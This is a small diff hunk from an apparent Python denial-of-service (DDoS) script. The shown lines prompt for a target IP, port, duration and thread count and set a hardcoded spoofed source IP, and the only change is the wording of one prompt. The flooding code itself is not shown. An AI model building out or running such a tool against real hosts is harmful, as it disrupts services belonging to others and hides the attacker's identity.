@@ -71,7 +71,7 @@ else :
 print('DDos On')
 ip= str(input("                    Ip only :"))
 port= int(input("                    port Anonymous :"))
-choice = str(input("                   Your Attack? (y/n) only :"))
+choice = str(input("                   Your Attack? (y/n) anonymous :"))
 times= int(input("                   Time only :"))
 threads= int(input("                    threads Anonymous :"))
 fake_ip = '154.121.76.200'
